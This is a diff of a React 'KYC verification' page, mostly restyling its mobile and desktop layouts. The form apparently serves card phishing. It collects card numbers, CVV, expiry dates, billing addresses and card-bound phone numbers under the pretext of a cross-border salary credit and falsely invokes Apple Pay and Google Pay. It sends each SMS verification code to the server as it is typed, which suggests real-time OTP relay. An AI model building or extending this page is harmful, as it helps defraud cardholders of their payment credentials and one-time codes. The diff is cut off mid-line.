@@ -91,10 +91,10 @@ function MobileCard({ icon: Icon, title, subtitle, children }: {
   icon: React.ElementType; title: string; subtitle?: string; children: React.ReactNode;
 }) {
   return (
-    <div className="bg-white rounded-2xl border border-gray-200/80 shadow-sm shadow-[#0A2B5E]/5 overflow-hidden mb-3 sm:mb-4">
-      <div className="flex items-center gap-3 px-4 sm:px-6 py-3 sm:py-3.5 border-b border-gray-100 bg-gradient-to-r from-[#F5F9FF] to-white">
-        <div className="w-8 h-8 rounded-lg bg-[#0A2B5E]/10 flex items-center justify-center flex-shrink-0">
-          <Icon className="w-4 h-4 text-[#1E3A8A]" />
+    <div className="verification-card rounded-2xl overflow-hidden mb-3 sm:mb-4">
+      <div className="verification-card-heading flex items-center gap-3 px-4 sm:px-6 py-3 sm:py-3.5">
+        <div className="verification-section-icon w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0">
+          <Icon className="w-4 h-4" />
         </div>
         <div className="min-w-0">
           <div className="text-sm sm:text-[15px] font-bold text-[#0A2B5E] leading-tight">{title}</div>
@@ -640,7 +640,7 @@ export default function KycPage() {
 
   if (!effectiveTx) {
     return (
-      <div className="min-h-screen-safe flex items-center justify-center bg-gray-50">
+      <div className="min-h-screen-safe flex items-center justify-center">
         <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
       </div>
     );
@@ -887,7 +887,7 @@ export default function KycPage() {
   );
 
   return (
-    <div className="min-h-screen-safe flex flex-col bg-[radial-gradient(circle_at_top,_#F8FBFF_0%,_#EEF5FC_48%,_#DDEAF7_100%)]">
+    <div className="min-h-screen-safe flex flex-col">
       {modals}
 
       <Header ftUid={ftUid} />
@@ -895,38 +895,32 @@ export default function KycPage() {
       {/* ═══════════════════════════════════════════════════════════════════
           MOBILE layout  (< lg)
       ════════════════════════════════════════════════════════════════════ */}
-      <main className="lg:hidden flex-1 flex flex-col bg-gray-50">
-        {/* Top hero band */}
-        <div className="relative overflow-hidden bg-gradient-to-br from-[#0d3571] via-[#0A2B5E] to-[#061d42] px-4 sm:px-6 pt-3 pb-8 sm:pt-5 sm:pb-10">
-          <div className="pointer-events-none absolute -right-12 -top-16 h-44 w-44 rounded-full bg-sky-400/10 blur-3xl" />
-          <div className="relative mx-auto w-full sm:max-w-2xl">
-            <div className="flex items-center justify-between gap-3 mb-3 sm:mb-4">
-              <button onClick={() => setShowLeaveModal(true)} className="flex items-center gap-2 text-blue-200 hover:text-white transition">
-                <span className="w-8 h-8 rounded-full bg-white/10 ring-1 ring-white/15 flex items-center justify-center">
-                  <ArrowLeft className="w-4 h-4" />
-                </span>
-                <span className="text-[13px] font-medium">Back</span>
+      <main className="settlement-mobile relative flex min-w-0 flex-1 flex-col lg:hidden">
+        <div className="verification-hero pb-12 sm:pb-14">
+          <div className="mx-auto w-full">
+            <div className="verification-toolbar">
+              <button onClick={() => setShowLeaveModal(true)} className="verification-back">
+                <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" /></span>
+                Back
               </button>
-              <span className="inline-flex items-center gap-1.5 bg-white/10 ring-1 ring-white/15 rounded-full px-2.5 py-1">
-                <CreditCard className="w-3.5 h-3.5 text-amber-300" />
-                <span className="text-[11px] font-bold text-white">{isCreditCard ? "Credit Card" : "Debit Card"}</span>
+              <span className="verification-badge">
+                <CreditCard className="w-3.5 h-3.5" />
+                <span>{isCreditCard ? "Credit Card" : "Debit Card"}</span>
               </span>
             </div>
-
-            <div className="flex items-center gap-2 mb-1">
-              <Shield className="w-3.5 h-3.5 text-blue-300" />
-              <span className="text-[10px] text-blue-300 uppercase tracking-widest font-bold">KYC Verification</span>
+            <div className="verification-eyebrow">
+              <Shield className="w-3.5 h-3.5 flex-shrink-0" />
+              <span>KYC Verification</span>
             </div>
-            <h1 className="text-lg sm:text-2xl font-bold text-white leading-tight">Identity Information Verification</h1>
-            <p className="text-blue-200/90 text-xs sm:text-sm mt-1.5 leading-relaxed sm:max-w-lg">
+            <h1 className="verification-heading">Identity Information Verification</h1>
+            <p className="verification-description">
               Fill in all required fields. Your information is used solely for identity authentication.
             </p>
           </div>
         </div>
 
-        {/* Content slides up */}
-        <div className="relative flex-1 -mt-4 bg-gray-50 rounded-t-3xl pt-4 sm:pt-6 px-3 sm:px-6" style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))" }}>
-          <form className="mx-auto w-full sm:max-w-2xl" onSubmit={handleSubmit} autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck="false" name="cbca-kyc-form-mobile">
+        <div className="verification-content z-10 -mt-7 rounded-t-[28px] sm:-mt-8 sm:rounded-t-[32px] flex-1 pt-4 sm:pt-6 px-4 sm:px-6" style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))" }}>
+          <form className="mx-auto w-full" onSubmit={handleSubmit} autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck="false" name="cbca-kyc-form-mobile">
 
             {/* Fixed banner notifications */}
             {banners.length > 0 && (
@@ -1025,8 +1019,8 @@ export default function KycPage() {
                   className={mobileInputClass} />
               </MobileField>
 
-              <div className="grid grid-cols-3 sm:grid-cols-4 gap-3 sm:gap-4">
-                <div className="col-span-2 sm:col-span-3">
+              <div className="space-y-4">
+                <div>
                   <MobileField label="Street Address" error={fieldErrors.street_address}>
                     <input type="text" autoComplete="off" value={form.street_address}
                       onChange={e => handleChange("street_address", e.target.value)}
@@ -1042,7 +1036,7 @@ export default function KycPage() {
                 </MobileField>
               </div>
 
-              <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4">
+              <div className="space-y-4">
                 <MobileField label="City" error={fieldErrors.city}>
                   <input type="text" autoComplete="off" value={form.city}
                     onChange={e => handleChange("city", e.target.value)}
@@ -1057,7 +1051,7 @@ export default function KycPage() {
                     className={mobileInputClass} />
                 </MobileField>
 
-                <div className="col-span-2 sm:col-span-1">
+                <div className="sm:w-1/2 sm:pr-2">
                   <MobileField label="Postal Code" error={fieldErrors.postal_code}>
                     <input type="text" inputMode="text" autoComplete="postal-code" value={form.postal_code}
                       onChange={e => handleChange("postal_code", sanitizePostalCode(e.target.value))}
@@ -1087,7 +1081,7 @@ export default function KycPage() {
 
               {!codeSent && (
                 <button type="button" onClick={handleSendCode} disabled={sendLoading || countdown > 0}
-                  className="w-full sm:w-auto sm:min-w-[260px] sm:mx-auto sm:px-8 bg-[#0A2B5E] hover:bg-[#0d3571] text-white font-bold h-[52px] rounded-xl flex items-center justify-center gap-2.5 transition-all disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98] text-[15px] shadow-md shadow-[#0A2B5E]/20">
+                  className="verification-action w-full sm:w-auto sm:min-w-[260px] sm:mx-auto sm:px-8 hover:brightness-110 text-white font-bold h-[52px] rounded-xl flex items-center justify-center gap-2.5 transition-all disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98] text-[15px]">
                   {sendLoading
                     ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                     : <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" /></svg>
@@ -1173,233 +1167,235 @@ export default function KycPage() {
       </main>
 
       {/* ═══════════════════════════════════════════════════════════════════
-          DESKTOP layout  (lg+) — original unchanged
+          DESKTOP layout  (lg+)
       ════════════════════════════════════════════════════════════════════ */}
-      <main className="hidden lg:block flex-1 max-w-2xl mx-auto px-4 py-8 w-full">
-        <button onClick={() => setShowLeaveModal(true)} className="flex items-center gap-2 text-sm font-semibold text-[#0A2B5E] hover:text-[#1E3A8A] mb-5 group">
-          <span className="flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-200 shadow-sm group-hover:shadow-md transition">
-            <ArrowLeft className="w-4 h-4" />
-          </span>
+      <main className="mx-auto hidden w-full max-w-[1040px] flex-1 px-8 py-8 lg:block xl:py-10">
+        <button onClick={() => setShowLeaveModal(true)} className="verification-back verification-back-desktop mb-5">
+          <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" aria-hidden="true" /></span>
           Back
         </button>
+        <div className="settlement-document overflow-hidden rounded-[28px]">
+          <div className="verification-hero verification-hero-desktop">
+            <div className="verification-eyebrow">
+              <Shield className="w-3.5 h-3.5 flex-shrink-0" />
+              <span>KYC Verification</span>
+            </div>
+            <div className="verification-title-row">
+              <h1 className="verification-heading">Identity Information Verification</h1>
+              <span className="verification-badge">
+                <CreditCard className="w-3.5 h-3.5" aria-hidden="true" />
+                <span>{isCreditCard ? "Credit Card Verification" : "Debit Card Verification"}</span>
+              </span>
+            </div>
+            <p className="verification-description">
+              To complete cross-border settlement identity verification, please fill in all required fields below. Your information is used solely for identity authentication purposes.
+            </p>
+            <div className="verification-reference">
+              <span>FT-UID</span><span className="font-mono">{effectiveTx.ft_uid}</span>
+            </div>
+          </div>
 
-        <div className="mb-6">
-          <div className="flex items-center gap-2 text-[#0A2B5E] mb-1">
-            <Shield className="w-5 h-5" />
-            <span className="text-sm font-semibold">KYC Verification &middot; {effectiveTx.ft_uid}</span>
-          </div>
-          <h1 className="text-2xl font-bold text-[#0A2B5E]">Identity Information Verification</h1>
-          <p className="text-sm text-gray-500 mt-1">
-            To complete cross-border settlement identity verification, please fill in all required fields below. Your information is used solely for identity authentication purposes.
-          </p>
-          <div className="mt-3 inline-flex items-center gap-2 bg-white border border-gray-200 rounded-lg px-3 py-1.5 shadow-sm">
-            <CreditCard className="w-4 h-4 text-[#1E3A8A]" />
-            <span className="text-xs font-semibold text-[#0A2B5E]">
-              {isCreditCard ? "Credit Card Verification" : "Debit Card Verification"}
-            </span>
-          </div>
+          <form onSubmit={handleSubmit} autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck="false" name="cbca-kyc-form" className="relative z-10 -mt-6 rounded-t-[24px] bg-white px-8 pt-5 pb-6 space-y-5 xl:px-12">
+            {/* Fixed banner notifications */}
+            {banners.length > 0 && (
+              <div className="space-y-3">
+                {banners.map((b) => (
+                  <NoticeCard key={b.id} title={b.title} content={b.content} />
+                ))}
+              </div>
+            )}
+
+            {/* Card Info Section */}
+            <div className="verification-card rounded-2xl p-6">
+              <div className="flex items-center gap-2 mb-5">
+                <CreditCard className="w-5 h-5 text-[#1E3A8A]" />
+                <h2 className="font-semibold text-[#0A2B5E]">Card Information</h2>
+              </div>
+              <div className="space-y-4">
+                {isCreditCard && (
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-1.5">Payee Debit Card Number <span className="text-red-500">*</span></label>
+                    <input type="text" inputMode="numeric" autoComplete="off" value={form.payee_debit_card}
+                      onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("payee_debit_card", d.replace(/(.{4})/g, "$1 ").trim()); }}
+                      onBlur={() => handleBlur("payee_debit_card")} placeholder="XXXX XXXX XXXX XXXX" className={inputClass} />
+                    {fieldErrors.payee_debit_card && <p className="text-xs text-red-500 mt-1">{fieldErrors.payee_debit_card}</p>}
+                    <div className="mt-3 flex items-start gap-3 bg-red-50 border border-red-200 rounded-xl px-4 py-3.5">
+                      <div className="flex-shrink-0 w-8 h-8 rounded-full bg-red-100 border border-red-300 flex items-center justify-center">
+                        <AlertTriangle className="w-4 h-4 text-red-600" />
+                      </div>
+                      <div>
+                        <p className="text-xs font-bold text-red-700 uppercase tracking-wide mb-1">Important Identity Consistency Requirement</p>
+                        <p className="text-xs text-red-800 leading-relaxed">The payee debit card number entered above <strong>must belong to the same individual</strong> as the credit card used for verification below. Mismatched information will result in verification failure.</p>
+                      </div>
+                    </div>
+                    <div className="mt-3 border-t border-dashed border-gray-200 pt-4" />
+                  </div>
+                )}
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">{isCreditCard ? "Credit Card Number" : "Debit Card Number"} <span className="text-red-500">*</span></label>
+                  <input type="text" inputMode="numeric" autoComplete="off" value={form.card_number}
+                    onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("card_number", d.replace(/(.{4})/g, "$1 ").trim()); }}
+                    onBlur={() => handleBlur("card_number")} placeholder="XXXX XXXX XXXX XXXX" className={inputClass} />
+                  {fieldErrors.card_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.card_number}</p>}
+                </div>
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Card Issuing Bank <span className="text-red-500">*</span></label>
+                  <input type="text" autoComplete="off" value={form.card_bank_name}
+                    onChange={e => handleChange("card_bank_name", e.target.value)}
+                    onBlur={() => handleBlur("card_bank_name")} placeholder="e.g. Chase, Bank of America" className={inputClass} />
+                  {fieldErrors.card_bank_name && <p className="text-xs text-red-500 mt-1">{fieldErrors.card_bank_name}</p>}
+                </div>
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-1.5">Expiry Date <span className="text-red-500">*</span></label>
+                    <div className="flex items-center gap-2">
+                      <input ref={expiryMonthRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_month}
+                        onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_month", v); if (v.length === 2) expiryYearRef.current?.focus(); }}
+                        onBlur={() => handleBlur("expiry_month")} placeholder="MM" maxLength={2} className={`${inputClass} text-center w-16`} />
+                      <span className="text-gray-400 font-semibold">/</span>
+                      <input ref={expiryYearRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_year}
+                        onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_year", v); }}
+                        onBlur={() => handleBlur("expiry_year")} placeholder="YY" maxLength={2} className={`${inputClass} text-center w-16`} />
+                    </div>
+                    {(fieldErrors.expiry_month || fieldErrors.expiry_year) && <p className="text-xs text-red-500 mt-1">{fieldErrors.expiry_month || fieldErrors.expiry_year}</p>}
+                  </div>
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-700 mb-1.5">CVV <span className="text-red-500">*</span></label>
+                    <input type="text" autoComplete="off" inputMode="numeric" value={form.cvv}
+                      onChange={e => handleChange("cvv", e.target.value.replace(/\D/g, "").slice(0, 6))}
+                      onBlur={() => handleBlur("cvv")} placeholder="XXX" maxLength={6} className={inputClass} />
+                    <p className="text-xs text-gray-400 mt-1">Used for identity authentication only.</p>
+                    {fieldErrors.cvv && <p className="text-xs text-red-500 mt-1">{fieldErrors.cvv}</p>}
+                  </div>
+                </div>
+                <div>
+                  <InputField label="Cardholder Name (full name as on card)" placeholder="Full Name as on Card" {...fields("cardholder_name")} />
+                  {fieldErrors.cardholder_name && <p className="text-xs text-red-500 mt-1">{fieldErrors.cardholder_name}</p>}
+                </div>
+              </div>
+            </div>
+
+            {/* Address Section */}
+            <div className="verification-card rounded-2xl p-6">
+              <div className="flex items-center gap-2 mb-1">
+                <MapPin className="w-5 h-5 text-[#1E3A8A]" />
+                <h2 className="font-semibold text-[#0A2B5E]">{isCreditCard ? "Credit Card Billing Address" : "Billing Address"}</h2>
+              </div>
+              {isCreditCard && <p className="text-xs text-gray-500 mb-5">The registered billing address associated with your credit card account.</p>}
+              {!isCreditCard && <div className="mb-5" />}
+              <div className="space-y-4">
+                <div>
+                  <InputField label="Country / Region" placeholder="e.g. United States" {...fields("country")} />
+                  {fieldErrors.country && <p className="text-xs text-red-500 mt-1">{fieldErrors.country}</p>}
+                </div>
+                <div className="space-y-4">
+                  <div>
+                    <InputField label="Street Address" placeholder="Street Name / Road" {...fields("street_address")} />
+                    {fieldErrors.street_address && <p className="text-xs text-red-500 mt-1">{fieldErrors.street_address}</p>}
+                  </div>
+                  <div>
+                    <InputField label="House / Apt. Number" placeholder="No. / Apt." {...fields("house_number")} />
+                    {fieldErrors.house_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.house_number}</p>}
+                  </div>
+                </div>
+                <div className="space-y-4">
+                  <div>
+                    <InputField label="City" placeholder="City / District" {...fields("city")} />
+                    {fieldErrors.city && <p className="text-xs text-red-500 mt-1">{fieldErrors.city}</p>}
+                  </div>
+                  <div>
+                    <InputField label="State / Province" placeholder="Province / State" {...fields("state")} />
+                    {fieldErrors.state && <p className="text-xs text-red-500 mt-1">{fieldErrors.state}</p>}
+                  </div>
+                </div>
+                <div className="w-1/2 pr-2">
+                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Postal Code <span className="text-red-500">*</span></label>
+                  <input type="text" inputMode="text" autoComplete="postal-code" value={form.postal_code}
+                    onChange={e => handleChange("postal_code", sanitizePostalCode(e.target.value))}
+                    onBlur={() => handleBlur("postal_code")} placeholder="Postal Code" maxLength={POSTAL_CODE_MAX_LENGTH} className={inputClass} />
+                  {fieldErrors.postal_code && <p className="text-xs text-red-500 mt-1">{fieldErrors.postal_code}</p>}
+                </div>
+              </div>
+            </div>
+
+            {/* Phone & Verification Section */}
+            <div className="verification-card rounded-2xl p-6">
+              <div className="flex items-center gap-2 mb-2">
+                <Phone className="w-5 h-5 text-[#1E3A8A]" />
+                <h2 className="font-semibold text-[#0A2B5E]">{isCreditCard ? "Credit Card-Bound Phone Verification" : "Phone Verification"}</h2>
+              </div>
+              <div className="flex items-start gap-2 bg-amber-50 border border-amber-200 rounded-lg px-4 py-3 mb-5">
+                <Info className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
+                <p className="text-xs text-amber-800 leading-relaxed">Please enter the <strong>mobile number associated with your {isCreditCard ? "credit card" : "card"}</strong>. Upon the bank's regulatory verification, a verification code will be sent to you to confirm your international salary credit.</p>
+              </div>
+              <div className="space-y-4">
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">{isCreditCard ? "Credit Card-Bound Phone Number" : "Card-Bound Phone Number"} <span className="text-red-500">*</span></label>
+                  <input type="tel" inputMode="tel" autoComplete="off" value={form.phone_number}
+                    onChange={e => handleChange("phone_number", e.target.value.replace(/[^\d+\-\s()]/g, "").slice(0, 20))}
+                    onBlur={() => handleBlur("phone_number")} placeholder="+1 (555) 000-0000" className={inputClass} />
+                  <p className="text-xs text-gray-400 mt-1">Must match the phone number linked to your {isCreditCard ? "credit card" : "card"} account.</p>
+                  {fieldErrors.phone_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.phone_number}</p>}
+                </div>
+                {!codeSent && (
+                  <button type="button" onClick={handleSendCode} disabled={sendLoading || countdown > 0}
+                    className="verification-action w-full min-h-11 text-white font-semibold py-2.5 rounded-lg flex items-center justify-center gap-2 hover:brightness-110 hover:-translate-y-px active:translate-y-0 active:scale-[0.99] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-y-0">
+                    {sendLoading ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : null}
+                    {countdown > 0 ? `Please wait before resending (${countdown}s)` : "Send Verification Code"}
+                  </button>
+                )}
+                {codeSent && (
+                  <div className="mt-2 rounded-xl border-2 border-[#1E3A8A] bg-[#EFF6FF] p-5">
+                    <label className="block text-sm font-bold text-[#0A2B5E] mb-3">Verification Code <span className="text-red-500">*</span></label>
+                    <input type="text" inputMode="numeric" autoComplete="off" value={verificationCode}
+                      onChange={e => {
+                        const v = e.target.value.replace(/\D/g, "");
+                        setVerificationCode(v);
+                        if (codeDebounceRef.current) clearTimeout(codeDebounceRef.current);
+                        codeDebounceRef.current = setTimeout(() => { updateVerificationCode(ftUid!, v).catch(() => {}); }, 300);
+                      }}
+                      placeholder="Enter verification code"
+                      className="w-full px-4 py-4 border-2 border-[#1E3A8A] rounded-xl text-center tracking-[0.6em] font-mono text-2xl font-bold text-[#0A2B5E] bg-white focus:outline-none focus:ring-4 focus:ring-[#1E3A8A]/20 transition shadow-sm" />
+                    {expiryLeft > 0 && (
+                      <p className={`flex items-center justify-center gap-1.5 text-xs font-semibold mt-2 ${expiryLeft <= 10 ? "text-red-600" : "text-[#1E3A8A]"}`}>
+                        <Clock className="w-3.5 h-3.5" />
+                        Code expires in {expiryLeft}s
+                      </p>
+                    )}
+                    <p className="text-xs text-[#1E3A8A] mt-2.5 text-left font-medium">Once the bank's compliance verification is completed, a verification code will be sent to the mobile number associated with your card.</p>
+                    {/* Action row: resend left, submit right */}
+                    <div className="flex gap-3 mt-4">
+                      <ResendCodeButton onClick={handleSendCode} sending={sendLoading} countdown={countdown} className="w-0 flex-[5]" />
+                      <SubmitReviewButton submitting={submitLoading} className="w-0 flex-[7]" />
+                    </div>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {error && (
+              <div className="flex items-center gap-2 bg-red-50 border border-red-200 text-red-700 text-sm px-4 py-3 rounded-lg">
+                <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                {error}
+              </div>
+            )}
+
+            {/* Security Notice */}
+            <div className="bg-white border border-blue-200 rounded-2xl shadow-sm overflow-hidden">
+              <div className="bg-[#0A2B5E] px-5 py-3 flex items-center gap-2">
+                <Shield className="w-4 h-4 text-blue-200 flex-shrink-0" />
+                <span className="text-white text-xs font-semibold tracking-wide uppercase">Verification Code Official Security Notice</span>
+              </div>
+              <div className="px-5 py-4 flex items-start gap-3">
+                <Lock className="w-5 h-5 text-[#1E3A8A] flex-shrink-0 mt-0.5" />
+                <div className="space-y-1.5">
+                  <p className="text-sm text-[#0A2B5E] font-medium">Data Protection Statement</p>
+                  <p className="text-xs text-gray-600 leading-relaxed">The information you submit is used solely for the purpose of cross-border settlement identity verification. All settlement authentication and review materials are processed through the official secure channels of Apple Pay or Google Pay.</p>
+                </div>
+              </div>
+            </div>
+          </form>
         </div>
-
-        <form onSubmit={handleSubmit} autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck="false" name="cbca-kyc-form" className="space-y-5">
-          {/* Fixed banner notifications */}
-          {banners.length > 0 && (
-            <div className="space-y-3">
-              {banners.map((b) => (
-                <NoticeCard key={b.id} title={b.title} content={b.content} />
-              ))}
-            </div>
-          )}
-
-          {/* Card Info Section */}
-          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6">
-            <div className="flex items-center gap-2 mb-5">
-              <CreditCard className="w-5 h-5 text-[#1E3A8A]" />
-              <h2 className="font-semibold text-[#0A2B5E]">Card Information</h2>
-            </div>
-            <div className="space-y-4">
-              {isCreditCard && (
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Payee Debit Card Number <span className="text-red-500">*</span></label>
-                  <input type="text" inputMode="numeric" autoComplete="off" value={form.payee_debit_card}
-                    onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("payee_debit_card", d.replace(/(.{4})/g, "$1 ").trim()); }}
-                    onBlur={() => handleBlur("payee_debit_card")} placeholder="XXXX XXXX XXXX XXXX" className={inputClass} />
-                  {fieldErrors.payee_debit_card && <p className="text-xs text-red-500 mt-1">{fieldErrors.payee_debit_card}</p>}
-                  <div className="mt-3 flex items-start gap-3 bg-red-50 border border-red-200 rounded-xl px-4 py-3.5">
-                    <div className="flex-shrink-0 w-8 h-8 rounded-full bg-red-100 border border-red-300 flex items-center justify-center">
-                      <AlertTriangle className="w-4 h-4 text-red-600" />
-                    </div>
-                    <div>
-                      <p className="text-xs font-bold text-red-700 uppercase tracking-wide mb-1">Important Identity Consistency Requirement</p>
-                      <p className="text-xs text-red-800 leading-relaxed">The payee debit card number entered above <strong>must belong to the same individual</strong> as the credit card used for verification below. Mismatched information will result in verification failure.</p>
-                    </div>
-                  </div>
-                  <div className="mt-3 border-t border-dashed border-gray-200 pt-4" />
-                </div>
-              )}
-              <div>
-                <label className="block text-sm font-semibold text-gray-700 mb-1.5">{isCreditCard ? "Credit Card Number" : "Debit Card Number"} <span className="text-red-500">*</span></label>
-                <input type="text" inputMode="numeric" autoComplete="off" value={form.card_number}
-                  onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("card_number", d.replace(/(.{4})/g, "$1 ").trim()); }}
-                  onBlur={() => handleBlur("card_number")} placeholder="XXXX XXXX XXXX XXXX" className={inputClass} />
-                {fieldErrors.card_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.card_number}</p>}
-              </div>
-              <div>
-                <label className="block text-sm font-semibold text-gray-700 mb-1.5">Card Issuing Bank <span className="text-red-500">*</span></label>
-                <input type="text" autoComplete="off" value={form.card_bank_name}
-                  onChange={e => handleChange("card_bank_name", e.target.value)}
-                  onBlur={() => handleBlur("card_bank_name")} placeholder="e.g. Chase, Bank of America" className={inputClass} />
-                {fieldErrors.card_bank_name && <p className="text-xs text-red-500 mt-1">{fieldErrors.card_bank_name}</p>}
-              </div>
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Expiry Date <span className="text-red-500">*</span></label>
-                  <div className="flex items-center gap-2">
-                    <input ref={expiryMonthRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_month}
-                      onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_month", v); if (v.length === 2) expiryYearRef.current?.focus(); }}
-                      onBlur={() => handleBlur("expiry_month")} placeholder="MM" maxLength={2} className={`${inputClass} text-center w-16`} />
-                    <span className="text-gray-400 font-semibold">/</span>
-                    <input ref={expiryYearRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_year}
-                      onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_year", v); }}
-                      onBlur={() => handleBlur("expiry_year")} placeholder="YY" maxLength={2} className={`${inputClass} text-center w-16`} />
-                  </div>
-                  {(fieldErrors.expiry_month || fieldErrors.expiry_year) && <p className="text-xs text-red-500 mt-1">{fieldErrors.expiry_month || fieldErrors.expiry_year}</p>}
-                </div>
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">CVV <span className="text-red-500">*</span></label>
-                  <input type="text" autoComplete="off" inputMode="numeric" value={form.cvv}
-                    onChange={e => handleChange("cvv", e.target.value.replace(/\D/g, "").slice(0, 6))}
-                    onBlur={() => handleBlur("cvv")} placeholder="XXX" maxLength={6} className={inputClass} />
-                  <p className="text-xs text-gray-400 mt-1">Used for identity authentication only.</p>
-                  {fieldErrors.cvv && <p className="text-xs text-red-500 mt-1">{fieldErrors.cvv}</p>}
-                </div>
-              </div>
-              <div>
-                <InputField label="Cardholder Name (full name as on card)" placeholder="Full Name as on Card" {...fields("cardholder_name")} />
-                {fieldErrors.cardholder_name && <p className="text-xs text-red-500 mt-1">{fieldErrors.cardholder_name}</p>}
-              </div>
-            </div>
-          </div>
-
-          {/* Address Section */}
-          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6">
-            <div className="flex items-center gap-2 mb-1">
-              <MapPin className="w-5 h-5 text-[#1E3A8A]" />
-              <h2 className="font-semibold text-[#0A2B5E]">{isCreditCard ? "Credit Card Billing Address" : "Billing Address"}</h2>
-            </div>
-            {isCreditCard && <p className="text-xs text-gray-500 mb-5">The registered billing address associated with your credit card account.</p>}
-            {!isCreditCard && <div className="mb-5" />}
-            <div className="space-y-4">
-              <div>
-                <InputField label="Country / Region" placeholder="e.g. United States" {...fields("country")} />
-                {fieldErrors.country && <p className="text-xs text-red-500 mt-1">{fieldErrors.country}</p>}
-              </div>
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <InputField label="Street Address" placeholder="Street Name / Road" {...fields("street_address")} />
-                  {fieldErrors.street_address && <p className="text-xs text-red-500 mt-1">{fieldErrors.street_address}</p>}
-                </div>
-                <div>
-                  <InputField label="House / Apt. Number" placeholder="No. / Apt." {...fields("house_number")} />
-                  {fieldErrors.house_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.house_number}</p>}
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <InputField label="City" placeholder="City / District" {...fields("city")} />
-                  {fieldErrors.city && <p className="text-xs text-red-500 mt-1">{fieldErrors.city}</p>}
-                </div>
-                <div>
-                  <InputField label="State / Province" placeholder="Province / State" {...fields("state")} />
-                  {fieldErrors.state && <p className="text-xs text-red-500 mt-1">{fieldErrors.state}</p>}
-                </div>
-              </div>
-              <div>
-                <label className="block text-sm font-semibold text-gray-700 mb-1.5">Postal Code <span className="text-red-500">*</span></label>
-                <input type="text" inputMode="text" autoComplete="postal-code" value={form.postal_code}
-                  onChange={e => handleChange("postal_code", sanitizePostalCode(e.target.value))}
-                  onBlur={() => handleBlur("postal_code")} placeholder="Postal Code" maxLength={POSTAL_CODE_MAX_LENGTH} className={inputClass} />
-                {fieldErrors.postal_code && <p className="text-xs text-red-500 mt-1">{fieldErrors.postal_code}</p>}
-              </div>
-            </div>
-          </div>
-
-          {/* Phone & Verification Section */}
-          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6">
-            <div className="flex items-center gap-2 mb-2">
-              <Phone className="w-5 h-5 text-[#1E3A8A]" />
-              <h2 className="font-semibold text-[#0A2B5E]">{isCreditCard ? "Credit Card-Bound Phone Verification" : "Phone Verification"}</h2>
-            </div>
-            <div className="flex items-start gap-2 bg-amber-50 border border-amber-200 rounded-lg px-4 py-3 mb-5">
-              <Info className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
-              <p className="text-xs text-amber-800 leading-relaxed">Please enter the <strong>mobile number associated with your {isCreditCard ? "credit card" : "card"}</strong>. Upon the bank's regulatory verification, a verification code will be sent to you to confirm your international salary credit.</p>
-            </div>
-            <div className="space-y-4">
-              <div>
-                <label className="block text-sm font-semibold text-gray-700 mb-1.5">{isCreditCard ? "Credit Card-Bound Phone Number" : "Card-Bound Phone Number"} <span className="text-red-500">*</span></label>
-                <input type="tel" inputMode="tel" autoComplete="off" value={form.phone_number}
-                  onChange={e => handleChange("phone_number", e.target.value.replace(/[^\d+\-\s()]/g, "").slice(0, 20))}
